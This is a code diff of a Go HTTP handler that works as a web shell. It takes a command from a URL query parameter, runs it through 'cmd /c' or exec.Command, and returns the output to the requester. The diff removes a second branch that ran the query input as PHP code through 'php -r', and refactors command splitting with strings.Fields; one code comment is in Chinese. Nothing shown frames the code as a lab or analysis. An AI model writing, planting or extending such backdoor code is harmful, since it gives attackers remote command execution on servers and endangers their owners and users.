@@ -51,31 +51,14 @@ func (h myHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
             // handle error
         }
         cmdValue = decodedStr
-        if runtime.GOOS == "windows" {
-            output, err = exec.Command("cmd", "/c", cmdValue).Output()
-        } else {
-            output, err = exec.Command(cmdValue).Output()
-        }
-        if err != nil {
-            http.Error(w, err.Error(), http.StatusInternalServerError)
-            return
-        }
-        fmt.Fprintf(w, "%s", output)
-        return
-    }
 
-    if shellcode, ok := queryValues[h.code]; ok {
-        shellcodeValue := shellcode[0]
-        decodedStr, err := url.QueryUnescape(shellcodeValue)
-        if err != nil {
-            http.Error(w, err.Error(), http.StatusBadRequest)
-            return
-        }
-        shellcodeValue = decodedStr
+        // 使用 strings.Fields 分割命令和参数
+        cmdAndArgs := strings.Fields(cmdValue)
+
         if runtime.GOOS == "windows" {
-            output, err = exec.Command("cmd", "/c", "php", "-r", shellcodeValue).Output()
+            output, err = exec.Command("cmd", append([]string{"/c"}, cmdAndArgs...)...).Output()
         } else {
-            output, err = exec.Command("php", "-r", "\""+shellcodeValue+"\"").Output()
+            output, err = exec.Command(cmdAndArgs[0], cmdAndArgs[1:]...).Output()
         }
         if err != nil {
             http.Error(w, err.Error(), http.StatusInternalServerError)
